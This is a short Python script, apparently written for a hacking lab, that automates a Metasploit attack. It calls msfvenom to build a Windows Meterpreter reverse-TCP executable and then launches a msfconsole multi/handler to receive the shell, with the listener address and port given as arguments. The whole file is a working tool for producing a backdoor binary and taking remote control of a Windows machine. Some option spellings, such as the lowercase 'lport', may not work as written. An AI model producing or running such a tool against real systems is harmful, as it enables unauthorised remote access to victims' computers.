import subprocess
import argparse


def run_exploit(payload, lhost, lport):
    cmd = f"msfvenom -p {payload} LHOST={lhost} lport={lport} -f exe > WindowsShell64.exe"
    subprocess.run(cmd, shell=True)
    print("Created WindowsShell64.exe")

    msf_commands = f"""
    use exploit/multi/handler
    set payload payload/{payload}
    set LHOST {lhost}
    set LPORT {lport}
    exploit
    """
    msf_command_string = 'msfconsole -q -x "{}"'.format(msf_commands.replace('\n', '; '))
    subprocess.run(msf_command_string, shell=True)


def main():
    parser = argparse.ArgumentParser(
        description='Metasploit Shell Script',
        formatter_class=argparse.RawTextHelpFormatter,
        epilog='''
        Example usage:
            python exploit.py -l 10.10.14.206 -p 4444
        '''
    )
    parser.add_argument('-l', '--lhost', required=True, help='Local host IP address for the reverse shell')
    parser.add_argument('-p', '--lport', required=True, help='Local port for the reverse shell')

    if not any(arg in sys.argv for arg in ['-l', '--lhost', '-p', '--lport']):
        parser.print_help()
        print("\nPlease include the following arguments:")
        print("-l  - LHOST (Local host IP address for the reverse shell)")
        print("-p - LPORT (Local port for the reverse shell)")
        sys.exit(1)

    args = parser.parse_args()

    lhost = args.lhost
    payload = "windows/meterpreter/reverse_tcp"
    lport = args.lport

    run_exploit(payload, lhost, lport)

if __name__ == "__main__":
    import sys
    main()

    
